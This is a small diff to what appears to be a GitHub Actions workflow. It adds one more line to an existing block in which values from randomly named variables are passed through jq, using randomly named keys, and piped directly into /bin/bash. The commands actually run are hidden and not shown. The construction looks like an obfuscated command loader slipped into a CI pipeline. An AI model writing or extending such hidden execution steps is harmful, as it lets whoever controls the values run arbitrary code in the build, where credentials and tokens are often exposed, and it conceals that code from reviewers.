@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$duhmc7439" | jq -r .n110 | /bin/bash
           echo $kjy626 | jq -r .un4 | /bin/bash
           echo $mdw5 | jq -r .v89 | /bin/bash
+          printf '%s' "$yxios481" | jq -r .ygm78224 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
